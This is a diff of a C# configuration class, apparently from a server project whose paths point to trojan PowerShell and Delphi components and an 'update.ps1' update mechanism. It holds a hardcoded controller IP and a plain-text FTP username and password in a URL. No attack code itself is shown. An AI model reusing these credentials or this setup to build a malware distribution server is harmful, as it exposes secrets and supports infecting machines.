@@ -1,62 +1,32 @@
-﻿using System.Text.Json;
-using System.Text.Json.Serialization;
+﻿using System.Text.Json.Serialization;
 
 namespace model;
 
 public class ServerModel
 {
     // statics
-    [JsonPropertyName("rootDir")] public string RootDir => RootDirStatic;
-    
-    public static string DomainControllerStatic = "185.247.141.76";
-    [JsonPropertyName("domainController")]
-    public string DomainController => DomainControllerStatic;
-    
-  
-    [JsonPropertyName("cpDir")] public string CpDir => CpDirStatic;
-    
-
-    [JsonPropertyName("certDir")] public string CertDir => CertDirStatic;
-    
-    public static string SysDirStatic => Path.Combine(RootDirStatic, "sys");
-    [JsonPropertyName("sysDir")] public string SysDir => SysDirStatic;
-    
-    public static string CmplDirStatic => Path.Combine(RootDirStatic, "cmpl");
-    [JsonPropertyName("cmplDir")] public string CmplDir => CmplDirStatic;
-    
-    public static string AdsDirStatic => Path.Combine(RootDirStatic, "ads");
-    [JsonPropertyName("adsDir")] public string AdsDir => AdsDirStatic;
-    
-    public static string UpdDirStatic => Path.Combine(RootDirStatic, "troyan/upd");
-    [JsonPropertyName("updDir")] public string UpdDir => UpdDirStatic;
+    [JsonPropertyName("rootDir")] public string RootDir => ServerModelLoader.RootDirStatic;
+    [JsonPropertyName("domainController")] public string DomainController => ServerModelLoader.DomainControllerStatic;
+    [JsonPropertyName("cpDir")] public string CpDir => ServerModelLoader.CpDirStatic;
+    [JsonPropertyName("certDir")] public string CertDir =>ServerModelLoader.CertDirStatic;
+    [JsonPropertyName("sysDir")] public string SysDir => ServerModelLoader.SysDirStatic;
+    [JsonPropertyName("cmplDir")] public string CmplDir => ServerModelLoader.CmplDirStatic;
+    [JsonPropertyName("adsDir")] public string AdsDir => ServerModelLoader.AdsDirStatic;
+    [JsonPropertyName("updDir")] public string UpdDir => ServerModelLoader.UpdDirStatic;
     [JsonPropertyName("updateFile")] public string UpdateFile => Path.Combine(UpdDir, "update.ps1");
-    
-    public static string TroyanScriptDirStatic => Path.Combine(RootDirStatic, "troyan/troyanps");
-    [JsonPropertyName("troyanScriptDir")] public string TroyanScriptDir => TroyanScriptDirStatic;
-    
-    public static string TroyanDelphiDirStatic => Path.Combine(RootDirStatic, "troyan/troyandelphi");
-    [JsonPropertyName("troyanDelphiDir")] public string TroyanDelphiDir => TroyanDelphiDirStatic;
+    [JsonPropertyName("troyanScriptDir")] public string TroyanScriptDir => ServerModelLoader.TroyanScriptDirStatic;
+    [JsonPropertyName("troyanDelphiDir")] public string TroyanDelphiDir => ServerModelLoader.TroyanDelphiDirStatic;
     
     
     // server-depended
-    [JsonPropertyName("server")] 
-    public string Server { get; set; }
-    
+    [JsonPropertyName("server")] public string Server { get; set; }
     [JsonPropertyName("userDataDir")] public string UserDataDir => @$"C:\data\{Server}";
-    
     [JsonPropertyName("userServerFile")] public string UserServerFile => Path.Combine(UserDataDir, "server.json");
-    
-    [JsonPropertyName("ftpAds")]
-    public string FtpAds => $@"ftp://ftpads:Abc12345!@{Server}";
-    
-    [JsonPropertyName("ftpAdsAsHttp")]
-    public string FtpAdsAsHttp => $@"http://{Server}/ads";
-
+    [JsonPropertyName("ftpAds")] public string FtpAds => $@"ftp://ftpads:Abc12345!@{Server}";
+    [JsonPropertyName("ftpAdsAsHttp")] public string FtpAdsAsHttp => $@"http://{Server}/ads";
     [JsonPropertyName("ftpUserData")] public string FtpUserData { get; set; }
-    
     [JsonPropertyName("ftpUserDataAsHttp")]
     public string FtpUserDataAsHttp =>  $@"http://{Server}/data";
-    
     [JsonPropertyName("updateUrl")] public string UpdateUrl => $"http://{Server}/data/update.txt";
     
     
